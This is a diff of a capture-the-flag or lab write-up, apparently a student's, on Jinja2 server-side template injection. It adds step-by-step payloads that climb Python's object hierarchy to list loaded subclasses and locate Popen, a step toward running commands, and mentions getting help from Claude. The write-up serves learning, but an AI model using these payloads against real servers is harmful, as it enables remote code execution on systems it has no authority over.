@@ -45,11 +45,31 @@ The payload I used to identify if there is an SSTI vulnerability is `{{7*7}}`
 
 ### Step 3: Exploit with Jinja2
 
-(add your payloads and explanation here)
+1. I read the Jinja2 SSTI syntax from [HackTricks - Jinja2 SSTI](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html)
+
+2. Since this was my first time doing SSTI, I used Claude to help me understand and construct the payload step by step. Instead of asking for a ready-made payload, I studied each step to understand how and why it works. Here is the payload along with its explanation and order of execution:
+
+3. {{[].__class__}} output = <class 'list'>
+
+[] — an empty list, just used as a starting object to climb the Python hierarchy
+
+.**class** — gets the class of that list → <class 'list'>
+
+2.{{[].__class__.__base__}} output = <class 'object'>
+
+.**base** — gets the parent class → <class 'object'>
+(every Python class inherits from object)
+
+3.{{[].__class__.__base__.__subclasses__()}}
+.**subclasses**() — returns ALL classes that inherit from object — a huge list of every class loaded in memory
+
+output:
+![steps](Images/3.png)
+
+4.{% for i in range([].__class__.__base__.__subclasses__()|length) %}{% if 'Popen' in [].__class__.__base__.__subclasses__()[i].__name__ %}{{i}}{% endif %}{% endfor %}
 
 ## Sources
 
-- [HackTricks - Jinja2 SSTI](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html)
 - [PortSwigger - SSTI](https://portswigger.net/web-security/server-side-template-injection#constructing-a-server-side-template-injection-attack)
 
 ## Flag
